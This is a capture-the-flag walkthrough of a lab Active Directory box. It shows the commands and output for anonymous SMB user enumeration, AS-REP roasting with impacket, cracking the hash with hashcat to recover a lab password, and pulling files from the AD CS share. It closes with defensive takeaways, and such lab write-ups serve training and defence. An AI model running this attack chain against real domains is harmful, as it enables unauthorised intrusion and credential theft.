---
title: "ShadowGate — Active Directory Walkthrough: Null Session to AS-REP Roast to AD CS"
description: "Active Directory walkthrough of ShadowGate (Windows Server 2022) — anonymous SMB user enumeration, AS-REP roasting a pre-auth-disabled account, and pivoting toward AD CS abuse."
date: 2026-07-05 13:00:00 +0000
categories: [Active Directory]
tags: [active-directory, as-rep-roasting, ad-cs, kerberos, smb, oscp]
difficulty: Medium
---

> **Box:** Active Directory (Hack Smarter / OSCP-style) · **OS:** Windows Server 2022 · **Domain:** shadow.gate · **Theme:** Null-session enum → AS-REP roasting → AD CS

ShadowGate is a proper Active Directory box — no web app, just a domain controller and the classic AD kill chain. I got a foothold the way you so often do against a misconfigured DC: an anonymous SMB session gave me the user list, one of those users was AS-REP roastable, and their password fell to rockyou in seconds. From there the trail points straight at Active Directory Certificate Services.

## Recon

```bash
┌──(kali@kali)-[~/Desktop/Hack Smarter/ShadowGate]
└─$ rustscan -a 10.0.21.211 -- -A
Open 10.0.21.211:53
Open 10.0.21.211:80
Open 10.0.21.211:88
Open 10.0.21.211:135
Open 10.0.21.211:139
Open 10.0.21.211:389
Open 10.0.21.211:445
Open 10.0.21.211:464
Open 10.0.21.211:593
Open 10.0.21.211:636
Open 10.0.21.211:3268
Open 10.0.21.211:3269
Open 10.0.21.211:3389
Open 10.0.21.211:5985
Open 10.0.21.211:9389
```

Trimming nmap to the essentials:

```text
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
389/tcp  open  ldap          Microsoft Windows AD LDAP (Domain: shadow.gate)
| ssl-cert: Subject: commonName=DC01.shadow.gate
| Issuer: commonName=shadow-DC01-CA/domainComponent=shadow
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0   # WinRM
9389/tcp open  adws?
```

The port spread screamed **domain controller**, and the LDAP certificate handed me the naming: domain **shadow.gate**, DC **DC01.shadow.gate**, plus a CA named **shadow-DC01-CA** already visible in the issuer field. First move — add both to `/etc/hosts`.

## SMB Enumeration — anonymous access

Signing was off, so I tried a null session and it worked:

```bash
┌──(kali@kali)-[~/Desktop/Hack Smarter/ShadowGate]
└─$ nxc smb 10.0.21.211 -u "" -p ""
SMB   10.0.21.211  445  DC01  [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:shadow.gate) (signing:False) (SMBv1:None)
SMB   10.0.21.211  445  DC01  [+] shadow.gate\:
```

That blank session was enough to pull the full domain user list:

```bash
┌──(kali@kali)-[~/Desktop/Hack Smarter/ShadowGate]
└─$ nxc smb 10.0.21.211 -u "" -p "" --users
SMB   10.0.21.211  445  DC01  -Username-      -Last PW Set-        -BadPW-  -Description-
SMB   10.0.21.211  445  DC01  Administrator   2026-01-11 11:33:05  0        Built-in account for administering the computer/domain
SMB   10.0.21.211  445  DC01  Guest           <never>              0        Built-in account for guest access
SMB   10.0.21.211  445  DC01  krbtgt          2026-01-12 02:45:27  0        Key Distribution Center Service Account
SMB   10.0.21.211  445  DC01  ATHENA          2026-03-04 15:23:19  0
SMB   10.0.21.211  445  DC01  mbrownlee       2026-03-04 15:24:05  0
SMB   10.0.21.211  445  DC01  bbrown          2026-01-15 14:24:07  0
SMB   10.0.21.211  445  DC01  jtrueblood      2026-04-28 18:14:47  0
SMB   10.0.21.211  445  DC01  jsmith          2026-03-04 15:26:29  0
SMB   10.0.21.211  445  DC01  clocke          2026-03-04 15:24:32  0
SMB   10.0.21.211  445  DC01  tclarke         2026-03-04 15:25:33  0
SMB   10.0.21.211  445  DC01  jbradford       2026-03-04 15:24:59  0
SMB   10.0.21.211  445  DC01  amoss           2026-03-04 15:25:52  0
SMB   10.0.21.211  445  DC01  [*] Enumerated 12 local users: SHADOW
```

I dropped those names into `users.txt`.

## AS-REP Roasting

With a user list and no credentials, AS-REP roasting is the obvious next play — it targets accounts that don't require Kerberos pre-authentication:

```bash
┌──(kali@kali)-[~/Desktop/Hack Smarter/ShadowGate]
└─$ impacket-GetNPUsers -usersfile users.txt -request -format hashcat -outputfile ASREProastables.txt -dc-ip DC01.shadow.gate 'shadow.gate/'
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ATHENA doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mbrownlee doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User bbrown doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$jtrueblood@SHADOW.GATE:8931dd65...a2158a2cd5a7...9e3ac6
[-] User jsmith doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User clocke doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User tclarke doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jbradford doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User amoss doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Only one account had pre-auth disabled — **jtrueblood** — and it returned a `$krb5asrep$` hash. Straight into hashcat with mode 18200:

```bash
┌──(kali@kali)-[~/Desktop/Hack Smarter/ShadowGate]
└─$ hashcat -a 0 -m 18200 ASREProastables.txt /usr/share/wordlists/rockyou.txt
$krb5asrep$23$jtrueblood@SHADOW.GATE:8931dd65...9e3ac6:blood_brothers
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
```

Initial access: **jtrueblood : blood_brothers**.

## Foothold — authenticated enumeration

Valid domain creds in hand, I checked share access:

```bash
┌──(kali@kali)-[~/Desktop/Hack Smarter/ShadowGate]
└─$ nxc smb 10.0.21.211 -u "jtrueblood" -p "blood_brothers" --shares
SMB   10.0.21.211  445  DC01  [+] shadow.gate\jtrueblood:blood_brothers
SMB   10.0.21.211  445  DC01  Share        Permissions  Remark
SMB   10.0.21.211  445  DC01  -----        -----------  ------
SMB   10.0.21.211  445  DC01  ADMIN$                    Remote Admin
SMB   10.0.21.211  445  DC01  C$                        Default share
SMB   10.0.21.211  445  DC01  CertEnroll   READ         Active Directory Certificate Services share
SMB   10.0.21.211  445  DC01  IPC$         READ         Remote IPC
SMB   10.0.21.211  445  DC01  NETLOGON     READ         Logon server share
SMB   10.0.21.211  445  DC01  SYSVOL       READ         Logon server share
```

**CertEnroll** stood out — the Active Directory Certificate Services share, a strong signal AD CS is in play. I pulled everything from it:

```bash
┌──(kali@kali)-[~/Desktop/Hack Smarter/ShadowGate]
└─$ smbclient //10.0.21.211/CertEnroll -U "jtrueblood"
smb: \> mget *
getting file \DC01.shadow.gate_shadow-DC01-CA.crt of size 877 ...
getting file \nsrev_shadow-DC01-CA.asp of size 323 ...
getting file \shadow-DC01-CA+.crl of size 725 ...
getting file \shadow-DC01-CA.crl of size 914 ...
```

The CA (`shadow-DC01-CA`) is confirmed on the box.

## Privilege Escalation — AD CS

*(This run's notes stop at the CertEnroll loot.)* With a valid domain user and a live enterprise CA, the natural next step is to enumerate the certificate templates for an ESC misconfiguration — running `certipy find` as jtrueblood to look for a vulnerable template, then abusing it to escalate toward Domain Admin. I'll complete this section once I've captured the certificate-abuse path.

## Takeaways

- **Anonymous SMB is a gift.** A null session that leaks the full user list turns "no creds" into "a target list for roasting."
- **AS-REP roasting needs nothing but a username.** Any account with pre-auth disabled is crackable offline — and weak passwords like `blood_brothers` don't survive rockyou.
- **CertEnroll = AD CS = look for ESC.** An exposed enterprise CA is one of the most reliable escalation paths in modern AD.
- **Defensive fixes:** disable anonymous SMB and enable signing, require Kerberos pre-auth on every account, enforce strong passwords, and audit certificate templates for insecure enrollment settings.
